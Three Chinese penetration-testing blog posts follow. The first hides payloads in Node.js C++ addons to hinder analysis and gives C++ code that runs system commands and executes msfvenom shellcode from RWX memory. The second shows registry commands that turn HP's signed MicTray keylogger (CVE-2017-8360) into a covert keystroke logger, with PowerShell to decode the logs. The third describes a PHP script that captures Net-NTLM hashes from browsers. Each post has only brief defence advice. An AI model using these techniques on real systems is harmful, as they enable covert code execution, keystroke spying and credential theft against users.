<article class="post">
  <h1>渗透测试中的Node.js——利用C++插件隐藏真实代码</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Node.js-Downloader%E7%9A%84%E5%AE%9E%E7%8E%B0/">《渗透测试中的Node.js——Downloader的实现》</a>开源了一个使用Node.js实现Downloader的代码，简要分析在渗透测试中的利用思路。</p>

<p>Node.js的语法简单易懂，所以Node.js代码也很容易被分析。</p>

<p>为了增加Node.js代码被分析的难度，我的思路是利用Node.js的一个功能，将payload以C++插件的形式进行封装。</p>

<p>这样不但能够增加Node.js代码被分析的难度，而且可以用C++代码来实现payload，已有的C++代码经过简单的修改即可使用，减小二次开发的成本。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>C++插件简介</li>
  <li>搭建C++插件的开发环境</li>
  <li>C++插件代码实例</li>
  <li>利用思路</li>
  <li>防御建议</li>
</ul>

<h2 id="0x02-c插件简介">0x02 C++插件简介</h2>
<hr>

<p>Node.js C++插件是用C++编写的动态链接库，可以使用require()函数加载到Node.js中。利用V8提供的API，可以实现JavaScript和C++的互相调用，打通JavaScript和C++之间的接口。</p>

<p>官方文档：</p>

<p>https://nodejs.org/api/addons.html</p>

<p>使用实例：</p>

<ol>
  <li>
    <p>编译成功一个C++插件，导出方法为：hello</p>
  </li>
  <li>
    <p>使用Node.js调用C++插件导出方法的代码如下：</p>
  </li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>const addon = require('./addon.node');
addon.hello();
</code></pre></div></div>

<ol>
  <li>执行代码</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node.exe test.js
</code></pre></div></div>

<h2 id="0x03-搭建c插件的开发环境">0x03 搭建C++插件的开发环境</h2>
<hr>

<h3 id="1windows开发环境">1、Windows开发环境</h3>

<p>测试系统：Win7sp1 x64</p>

<p>需要安装以下工具：</p>

<ul>
  <li>.NET Framework 4.5.1或更高版本</li>
  <li>Python 2.7</li>
  <li>Visual Studio 2015或更高版本</li>
</ul>

<p>具体搭建流程如下：</p>

<p>1.安装.NET Framework 4.5.1</p>

<p>https://www.microsoft.com/en-US/download/details.aspx?id=5842</p>

<p>2.下载Node.js</p>

<p>https://nodejs.org/en/download/</p>

<p>3.使用Windows-Build-Tools自动安装依赖工具</p>

<p>https://github.com/felixrieseberg/windows-build-tools</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd c:\
powershell
npm install --global windows-build-tools
</code></pre></div></div>

<p>如果安装失败，可选择手动安装以下工具：</p>

<ul>
  <li>Python 2.7</li>
  <li>Visual Studio 2015或更高版本</li>
</ul>

<p>4.安装node-gyp</p>

<p>https://github.com/nodejs/node-gyp</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>npm install -g node-gyp
</code></pre></div></div>

<h3 id="2linux开发环境">2、Linux开发环境</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://nodejs.org/dist/v10.15.3/node-v10.15.3-linux-x64.tar.xz
tar xf node-v10.15.3-linux-x64.tar.xz
cd node-v10.15.3-linux-x64
cd bin
export PATH=/root/node-v10.15.3-linux-x64/bin:$PATH
./npm install -g node-gyp
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>需要添加环境变量指定node的位置(<code class="language-plaintext highlighter-rouge">export PATH=/root/node-v10.15.3-linux-x64/bin:$PATH</code>)，否则在执行npm install会失败，提示<code class="language-plaintext highlighter-rouge">/usr/bin/env: ‘node’: No such file or directory</code></p>

<p>实例演示：</p>

<ol>
  <li>hello.cc:</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;node.h&gt;
namespace demo {
using v8::FunctionCallbackInfo;
using v8::Isolate;
using v8::Local;
using v8::NewStringType;
using v8::Object;
using v8::String;
using v8::Value;

void Method(const FunctionCallbackInfo&lt;Value&gt;&amp; args) {
  Isolate* isolate = args.GetIsolate();
  args.GetReturnValue().Set(String::NewFromUtf8(
      isolate, "world", NewStringType::kNormal).ToLocalChecked());
}

void Initialize(Local&lt;Object&gt; exports) {
  NODE_SET_METHOD(exports, "hello", Method);
}

NODE_MODULE(NODE_GYP_MODULE_NAME, Initialize)

}  // namespace demo
</code></pre></div></div>

<ol>
  <li>binding.gyp</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
  "targets": [
    {
      "target_name": "addon",
      "sources": [ "hello.cc" ]
    }
  ]
}
</code></pre></div></div>

<ol>
  <li>通过node-gyp编译，生成插件</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node-gyp configure
node-gyp build
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>可以合并成一条命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node-gyp configure build
</code></pre></div></div>

<p>Node.js支持交叉编译，具体参数说明可参考：</p>

<p>https://www.npmjs.com/package/node-pre-gyp</p>

<p>Linux系统下生成Windows64位系统下使用的插件命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node-gyp configure build --target_arch=x64 --target_platform=win32
</code></pre></div></div>

<h2 id="0x04-c插件代码实例">0x04 C++插件代码实例</h2>
<hr>

<p>在开发时，最好避免出现if这种的条件判断语句，直接使用会导致编译错误</p>

<h3 id="1-释放文件">1. 释放文件</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;node.h&gt;
#include &lt;stdio.h&gt;
namespace demo {
	using v8::FunctionCallbackInfo;
	using v8::Isolate;
	using v8::Local;
	using v8::Object;
	using v8::String;
	using v8::Value;

	void Method(const FunctionCallbackInfo&lt;Value&gt;&amp; args) {
		FILE* fp;
		fopen_s(&amp;fp, "new.txt", "ab+");
		char *buf = "123456";
		fwrite(buf, strlen(buf), 1, fp);
		fseek(fp, 0, SEEK_END);
		fclose(fp);
	}

	void init(Local&lt;Object&gt; exports) {
		NODE_SET_METHOD(exports, "hello", Method);
	}
	NODE_MODULE(NODE_GYP_MODULE_NAME, init)
}
</code></pre></div></div>

<h3 id="2-执行命令">2. 执行命令：</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;node.h&gt;
namespace demo {
	using v8::FunctionCallbackInfo;
	using v8::Isolate;
	using v8::Local;
	using v8::Object;
	using v8::String;
	using v8::Value;

	void Method(const FunctionCallbackInfo&lt;Value&gt;&amp; args) {
		system("powershell start calc.exe");
	}

	void init(Local&lt;Object&gt; exports) {
		NODE_SET_METHOD(exports, "hello", Method);
	}
	NODE_MODULE(NODE_GYP_MODULE_NAME, init)
}
</code></pre></div></div>

<h3 id="3执行shellcode">3.执行shellcode</h3>

<p>生成shellcode：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/x64/exec CMD=calc.exe -f c
</code></pre></div></div>

<p>加载shellcode并执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;node.h&gt;
#include &lt;Windows.h&gt;
namespace demo {
	using v8::FunctionCallbackInfo;
	using v8::Isolate;
	using v8::Local;
	using v8::Object;
	using v8::String;
	using v8::Value;

	void Method(const FunctionCallbackInfo&lt;Value&gt;&amp; args) {
		unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
			"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
			"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
			"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
			"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
			"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
			"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
			"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
			"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
			"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
			"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
			"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
			"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
			"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
			"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
			"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
			"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
			"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
			"\x63\x2e\x65\x78\x65\x00";
		void *sc = VirtualAlloc(0, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		memcpy(sc, shellcode, sizeof(shellcode));
		(*(int(*)()) sc)();

	}

	void init(Local&lt;Object&gt; exports) {
		NODE_SET_METHOD(exports, "hello", Method);
	}
	NODE_MODULE(NODE_GYP_MODULE_NAME, init)
}
</code></pre></div></div>

<p>编译好的插件已上传至github，地址如下：</p>

<p>https://github.com/3gstudent/test/raw/master/addon.node</p>

<p>以上插件代码的导出方法均为<code class="language-plaintext highlighter-rouge">hello</code>，调用方式如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>const addon = require('./addon.node');
addon.hello();
</code></pre></div></div>

<h2 id="0x05-利用思路">0x05 利用思路</h2>
<hr>

<p>1、被第三方可信程序加载</p>

<p>参考：</p>

<p>https://bbs.pediy.com/thread-249573.htm</p>

<p><code class="language-plaintext highlighter-rouge">t.exe</code>-&gt;<code class="language-plaintext highlighter-rouge">node.exe</code>-&gt;<code class="language-plaintext highlighter-rouge">main.js</code></p>

<p>main.js与addon.node放在同级目录，main.js的内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>const addon = require('./addon.node');
addon.hello();
</code></pre></div></div>

<p>addon.node的格式为dll文件，无法直接获得payload，增加静态分析的成本</p>

<h2 id="0x06-防御建议">0x06 防御建议</h2>
<hr>

<p>对t.exe的子进程(node.exe)行为进行判断，如果有可疑行为进行拦截，取消对该证书的信任</p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文介绍了Node.js中C++插件的用法，可以用来增加Node.js代码被分析的难度，最后分享了三个payload的写法。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on March  8, 2019
  </div>

  
</article><article class="post">
  <h1>CVE-2017-8360(Keylogger in HP Audio Driver)利用分析</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>2017年5月，瑞士安全公司Modzero的安全研究员Thorsten Schroeder发现HP的Conexant音频驱动中存在Keylogger，非法记录用户的键盘输入。
本文仅在技术研究的角度，测试和分析利用方法，给出防御建议，纠正部分文章中出现的错误理解。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>漏洞简要介绍</li>
  <li>漏洞复现</li>
  <li>利用思路</li>
  <li>防御建议</li>
</ul>

<h2 id="0x02-漏洞简要介绍">0x02 漏洞简要介绍</h2>
<hr>

<p>可供参考的资料：</p>

<p>https://www.modzero.ch/advisories/MZ-17-01-Conexant-Keylogger.txt</p>

<p>用户在安装HP的Conexant音频驱动后，将会创建计划任务，在用户登录后执行文件MicTray.exe</p>

<p><strong>注：</strong></p>

<p>32位程序为MicTray.exe，64位程序为MicTray64.exe</p>

<p>启动MicTray.exe会记录用户的键盘输入，以两种方式保存：</p>

<ul>
  <li>写入文件<code class="language-plaintext highlighter-rouge">C:\Users\Public\MicTray.log</code></li>
  <li>通过WinAPI OutputDebugString()记录内容，可被其他程序读取</li>
</ul>

<h2 id="0x03-漏洞复现">0x03 漏洞复现</h2>
<hr>

<p>关于漏洞复现的参考资料：</p>

<p>https://diablohorn.com/2017/05/12/repurposing-the-hp-audio-key-logger/</p>

<p>本节会对参考资料中的内容做扩展，介绍读取OutputDebugString()中记录的方法</p>

<p>存在漏洞的驱动下载地址：</p>

<p>ftp://whp-aus1.cold.extweb.hp.com/pub/softpaq/sp79001-79500/sp79420.html</p>

<p>该地址已经失效，单个文件的下载地址：</p>

<p>MicTray.exe：</p>

<p>https://www.virustotal.com/nl/file/e882149c43976dfadb2746eb2d75a73f0be5aa193623b18b50827f43cce3ed84/analysis/</p>

<p>MicTray64.exe：</p>

<p>https://www.virustotal.com/nl/file/c046c7f364b42388bb392874129da555d9c688dced3ac1d6a1c6b01df29ea7a8/analysis/</p>

<p>测试系统： Win7 x64(更新补丁)</p>

<h3 id="记录方法1将键盘记录内容写入文件cuserspublicmictraylog">记录方法1.将键盘记录内容写入文件<code class="language-plaintext highlighter-rouge">C:\Users\Public\MicTray.log</code></h3>

<h4 id="1添加注册表">(1)添加注册表</h4>

<p>使用MicTray.exe：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add hklm\SOFTWARE\Wow6432Node\Conexant\MicTray\Hotkey /v CustomSettings /t REG_DWORD /d 1
</code></pre></div></div>

<p>使用MicTray64.exe：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add hklm\SOFTWARE\Conexant\MicTray\Hotkey /v CustomSettings /t REG_DWORD /d 1
</code></pre></div></div>

<p>二选一即可</p>

<p>本次测试选择MicTray64.exe</p>

<h4 id="2运行mictrayexemictray64exe">(2)运行MicTray.exe/MicTray64.exe</h4>

<p>生成记录文件文件<code class="language-plaintext highlighter-rouge">C:\Users\Public\MicTray.log</code></p>

<p>记录键盘输入内容，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-1/2-1.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>低权限运行即可，想要记录高权限程序中的键盘输入，需要高权限运行</p>

<h3 id="记录方法2通过outputdebugstring输出键盘记录内容">记录方法2.通过OutputDebugString()输出键盘记录内容</h3>

<p>可以通过DbgView读取WinAPI OutputDebugString()的输出内容</p>

<p>下载地址：</p>

<p>https://live.sysinternals.com/Dbgview.exe</p>

<p>由于无法获得HP Conexant音频驱动的安装包，这里选择使用Procmon寻找触发方式</p>

<p><strong>注：</strong></p>

<p>也可以对其动态调试，找到函数判断条件</p>

<p>使用Procmon监控MicTray64.exe在运行时对注册表的操作，记录方法1（写入文件）的注册表操作如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-1/2-2.png" alt="Alt text"></p>

<p>DbgView输出如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-1/2-3.png" alt="Alt text"></p>

<p>尝试解决错误，添加注册表项：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add hklm\SOFTWARE\Conexant\MicTray\Hotkey /v HotKeyMicScancode /t REG_DWORD /d 1
reg add hklm\SOFTWARE\Conexant\MicTray\Hotkey /v HotKeySpkScancode /t REG_DWORD /d 1
reg add hklm\SOFTWARE\Conexant\MicTray\Hotkey /v PlaybackGPIO /t REG_DWORD /d 1
reg add hklm\SOFTWARE\Conexant\MicTray\Hotkey /v CaptureGPIO /t REG_DWORD /d 1
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>MicTray64.exe运行后会自动在注册表<code class="language-plaintext highlighter-rouge">hkcu\SOFTWARE\Conexant</code>添加配置信息</p>

<p>经测试，还需要清除注册表中的配置信息，否则DbgView无法获得键盘记录</p>

<p>清除配置信息：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg delete hkcu\SOFTWARE\Conexant /f 
</code></pre></div></div>

<p>重新启动MicTray64.exe，成功获得键盘记录消息，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-1/2-4.png" alt="Alt text"></p>

<p>综上，记录方法2（通过OutputDebugString()输出）的触发条件如下：</p>

<ul>
  <li>不存在注册表项hkcu\SOFTWARE\Conexant</li>
  <li>配置以下注册表项：
  reg add hklm\SOFTWARE\Conexant\MicTray\Hotkey /v CustomSettings /t REG_DWORD /d 1
  reg add hklm\SOFTWARE\Conexant\MicTray\Hotkey /v HotKeyMicScancode /t REG_DWORD /d 1
  reg add hklm\SOFTWARE\Conexant\MicTray\Hotkey /v HotKeySpkScancode /t REG_DWORD /d 1
  reg add hklm\SOFTWARE\Conexant\MicTray\Hotkey /v PlaybackGPIO /t REG_DWORD /d 1
  reg add hklm\SOFTWARE\Conexant\MicTray\Hotkey /v CaptureGPIO /t REG_DWORD /d 1</li>
</ul>

<h2 id="0x04-利用思路">0x04 利用思路</h2>
<hr>

<p>站在渗透测试的角度，分析可供利用的思路</p>

<p>通过修改注册表可以修改记录文件的保存位置：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add hkcu\SOFTWARE\Conexant\MicTray64.exe /v LogName /t REG_SZ /d "C:\test\log.txt"
</code></pre></div></div>

<h3 id="1针对32位系统的键盘记录">1、针对32位系统的键盘记录</h3>

<p>配置命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add hkcu\SOFTWARE\Conexant\MicTray.exe /v LogName /t REG_SZ /d "C:\test\log.txt"
reg add hklm\SOFTWARE\Conexant\MicTray\Hotkey /v CustomSettings /t REG_DWORD /d 1
</code></pre></div></div>

<p>执行MicTray.exe后，记录文件保存在<code class="language-plaintext highlighter-rouge">C:\test\log.txt</code></p>

<h3 id="2针对64位系统的键盘记录">2、针对64位系统的键盘记录</h3>

<p>32位程序(MicTray.exe)的配置命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add hkcu\SOFTWARE\Conexant\MicTray.exe /v LogName /t REG_SZ /d "C:\test\log.txt"
reg add hklm\SOFTWARE\Wow6432Node\Conexant\MicTray\Hotkey /v CustomSettings /t REG_DWORD /d 1
</code></pre></div></div>

<p>64位程序(MicTray64.exe)的配置命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add hkcu\SOFTWARE\Conexant\MicTray64.exe /v LogName /t REG_SZ /d "C:\test\log.txt"
reg add hklm\SOFTWARE\Conexant\MicTray\Hotkey /v CustomSettings /t REG_DWORD /d 1
</code></pre></div></div>

<p>该工具通过调用WinAPI SetwindowsHookEx()实现键盘记录，相对于常规的键盘记录程序，优点在于包含数字签名</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-1/3-1.png" alt="Alt text"></p>

<h3 id="3解析键盘记录内容">3、解析键盘记录内容</h3>

<p>日志文件记录的是键盘的虚拟键码</p>

<p>可以通过脚本实现将虚拟键码转换为键盘按键的名称</p>

<p>测试参考链接中的powershell代码：</p>

<p>https://www.modzero.ch/advisories/MZ-17-01-Conexant-Keylogger.txt</p>

<p>代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$filename = "c:\users\public\MicTray.log"

[System.IO.FileStream]   $fs = [System.IO.File]::Open(
      $filename, 
      [System.IO.FileMode]::Open, 
      [System.IO.FileAccess]::Read, 
      [System.IO.FileShare]::ReadWrite)
         
[System.IO.StreamReader] $fr = [System.IO.StreamReader]::new(
      $fs, 
      [Text.UTF8Encoding]::UNICODE)

$el = 0

while($el -lt 2) {
   
   $line = $fr.ReadLine()

   # handle broken newlines in log...
   if([string]::IsNullOrEmpty($line)) {
      $el++
   } else {
      $el=0
   }

   $mc = [regex]::Match($line, 
         "MicTray64.exe.*flags (0x0[A-Fa-f0-9]?).*vk (0x[A-Fa-f0-9]+)$")
   $r = $mc.Groups[2].Value

   if(-Not [string]::IsNullOrEmpty($r)) {
      $i = [convert]::ToInt32($r, 16)
      $c = [convert]::ToChar($i)
      
      if($i -lt 0x20 -or $i -gt 0x7E) { $c = '.' }
         
      write-host -NoNewLine $("{0}" -f $c)
   }
}
</code></pre></div></div>

<p>我在测试时代码报错，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-1/3-2.png" alt="Alt text"></p>

<p>这里提供一个简单的解决方法，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$filename = "c:\users\public\MicTray.log"
$fr = Get-Content $filename
foreach ($line in $fr)
{
   $mc = [regex]::Match($line, 
         "MicTray64.exe.*flags (0x0[A-Fa-f0-9]?).*vk (0x[A-Fa-f0-9]+)$")
   $r = $mc.Groups[2].Value

   if(-Not [string]::IsNullOrEmpty($r)) {
      $i = [convert]::ToInt32($r, 16)
      $c = [convert]::ToChar($i)
      
      if($i -lt 0x20 -or $i -gt 0x7E) { $c = '.' }
         
      write-host -NoNewLine $("{0}" -f $c)
   }
}
</code></pre></div></div>

<p>转换后的输出如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-1/3-3.png" alt="Alt text"></p>

<h2 id="0x05-防御建议">0x05 防御建议</h2>
<hr>

<p>添加文件黑名单</p>

<p>MicTray.exe：</p>

<p>SHA256:	<code class="language-plaintext highlighter-rouge">e882149c43976dfadb2746eb2d75a73f0be5aa193623b18b50827f43cce3ed84</code></p>

<p>MicTray64.exe:</p>

<p>SHA256:	<code class="language-plaintext highlighter-rouge">c046c7f364b42388bb392874129da555d9c688dced3ac1d6a1c6b01df29ea7a8</code></p>

<p><strong>注：</strong></p>

<p>更新Windows补丁并不能阻止该程序的运行</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文复现了CVE-2017-8360(Keylogger in HP Audio Driver)键盘记录的方法，分析利用思路，改进测试脚本，给出防御建议。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on October  1, 2018
  </div>

  
</article><article class="post">
  <h1>渗透技巧——利用PHP脚本从浏览器中获得Net-NTLM hash</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在上篇文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87HTTP%E5%8D%8F%E8%AE%AE%E8%8E%B7%E5%BE%97Net-NTLM-hash/">《渗透技巧——通过HTTP协议获得Net-NTLM hash》</a>介绍了通过HTTP协议获得客户端当前登录用户Net-NTLM hash的方法，侧重于介绍原理和思路，本文将要给出一个具体的实现方法，利用PHP脚本模拟Net-NTLM认证过程，提取出客户端的Net-NTLM hash</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>Net-NTLM认证过程</li>
  <li>利用PHP脚本模拟认证过程</li>
  <li>脚本编写细节</li>
  <li>实际测试</li>
</ul>

<h2 id="0x02-net-ntlm认证过程">0x02 Net-NTLM认证过程</h2>
<hr>

<p>参考资料：</p>

<p>https://www.innovation.ch/personal/ronald/ntlm.html</p>

<p>依然使用这幅图，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-10/2-1.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>图片截取自https://www.innovation.ch/personal/ronald/ntlm.html</p>

<h2 id="0x03-利用php脚本模拟认证过程">0x03 利用PHP脚本模拟认证过程</h2>
<hr>

<p>想要通过PHP脚本模拟Net-NTLM认证过程，主要考虑的是Server端的实现</p>

<h3 id="1发送www-authenticate-ntlm">1、发送<code class="language-plaintext highlighter-rouge">WWW-Authenticate: NTLM</code></h3>

<p>接收Client的GET请求，回复<code class="language-plaintext highlighter-rouge">401 Unauthorized WWW-Authenticate: NTLM</code>，提示Client需要NTLM认证</p>

<h3 id="2发送www-authenticate-ntlm-base64-encoded-type-2-message">2、发送<code class="language-plaintext highlighter-rouge">WWW-Authenticate: NTLM &lt;base64-encoded type-2-message&gt;</code></h3>

<p>接收Client的<code class="language-plaintext highlighter-rouge">Type-1-Message</code>，回复<code class="language-plaintext highlighter-rouge">Type-2-message</code></p>

<p>The Type 2 Message的结构如下：</p>

<table>
  <thead>
    <tr>
      <th>Offset</th>
      <th style="text-align: center">Description</th>
      <th style="text-align: right">Content</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>0</td>
      <td style="text-align: center">NTLMSSP Signature</td>
      <td style="text-align: right">Null-terminated ASCII “NTLMSSP” (0x4e544c4d53535000)</td>
    </tr>
    <tr>
      <td>8</td>
      <td style="text-align: center">NTLM Message Type</td>
      <td style="text-align: right">long (0x02000000)</td>
    </tr>
    <tr>
      <td>12</td>
      <td style="text-align: center">Target Name</td>
      <td style="text-align: right">security buffer</td>
    </tr>
    <tr>
      <td>20</td>
      <td style="text-align: center">Flags</td>
      <td style="text-align: right">long</td>
    </tr>
    <tr>
      <td>24</td>
      <td style="text-align: center">Challenge</td>
      <td style="text-align: right">8 bytes</td>
    </tr>
    <tr>
      <td>(32)</td>
      <td style="text-align: center">Context (optional)</td>
      <td style="text-align: right">8 bytes (two consecutive longs)</td>
    </tr>
    <tr>
      <td>(40)</td>
      <td style="text-align: center">Target Information (optional)</td>
      <td style="text-align: right">security buffer</td>
    </tr>
    <tr>
      <td>(48)</td>
      <td style="text-align: center">OS Version Structure (Optional)</td>
      <td style="text-align: right">8 bytes</td>
    </tr>
  </tbody>
</table>

<p>详细参数说明可参考：</p>

<p>http://davenport.sourceforge.net/ntlm.html#theType2Message</p>

<p>值得注意的参数为<code class="language-plaintext highlighter-rouge">Flags</code>和<code class="language-plaintext highlighter-rouge">Challenge</code></p>

<p>Challenge是使用hashcat破解Net-NTLM hash的必须参数</p>

<p>Flags包含多种类型，一个简单的Flags示例，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-10/2-2.png" alt="Alt text"></p>

<p>对应的数据格式如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-10/2-4.png" alt="Alt text"></p>

<h3 id="3解析type-3-message">3、解析Type-3-message</h3>

<p>Type-3-message包含Client加密后的Net-NTLM hash消息，提取出对应格式的数据可用于破解</p>

<p>Type-3-message示例如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-10/2-3.png" alt="Alt text"></p>

<p>这里需要注意每个参数的存储格式</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>short   Length;
short   Maxlen;
short   Offset;
</code></pre></div></div>

<p>Offset对应参数具体内容的偏移地址</p>

<h3 id="4发送网页内容">4、发送网页内容</h3>

<p>Server向Client提供最终的请求内容</p>

<h2 id="0x04-脚本编写细节">0x04 脚本编写细节</h2>
<hr>

<p>为了便于测试，不会对用户提交的凭据做验证，直接在HTTP的回复内容中返回用户的验证凭据</p>

<p>完整POC代码已开源，地址如下：</p>

<p>https://raw.githubusercontent.com/3gstudent/Writeup/master/catchyournetntlm.php</p>

<p>POC代码基于https://loune.net/2007/10/simple-lightweight-ntlm-in-php/</p>

<p>做了以下优化：</p>

<h4 id="1不再局限于apache-module">1、不再局限于apache module</h4>

<p>原脚本只能在apache下使用</p>

<h4 id="2提取net-ntlm-hash">2、提取Net-NTLM hash</h4>

<p>原脚本输出Client的三个属性： <code class="language-plaintext highlighter-rouge">$user</code> <code class="language-plaintext highlighter-rouge">$domain</code> <code class="language-plaintext highlighter-rouge">$workstation</code></p>

<p>新脚本添加了文件格式解析的功能，提取出<code class="language-plaintext highlighter-rouge">HMAC-MD5</code>和<code class="language-plaintext highlighter-rouge">blob</code></p>

<p><strong>脚本细节：</strong></p>

<p>原POC中的<code class="language-plaintext highlighter-rouge">function get_msg_str($msg, $start, $unicode = true)</code></p>

<p>在调用<code class="language-plaintext highlighter-rouge">$user = get_msg_str($msg, 36);</code>时，由于之前的Flags指定了<code class="language-plaintext highlighter-rouge">unicode</code>，所以默认执行以下代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if ($unicode)
        return str_replace("\0", '', substr($msg, $off, $len));
</code></pre></div></div>

<p>会自动去除字符串中的<code class="language-plaintext highlighter-rouge">0x00</code></p>

<p>而在提取<code class="language-plaintext highlighter-rouge">HMAC-MD5</code>和<code class="language-plaintext highlighter-rouge">blob</code>时，需要保留<code class="language-plaintext highlighter-rouge">0x00</code>，所以我们要传入参数false，不对字符<code class="language-plaintext highlighter-rouge">0x00</code>进行过滤</p>

<p>具体的代码为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$Response = get_msg_str($msg, 20,false);
</code></pre></div></div>

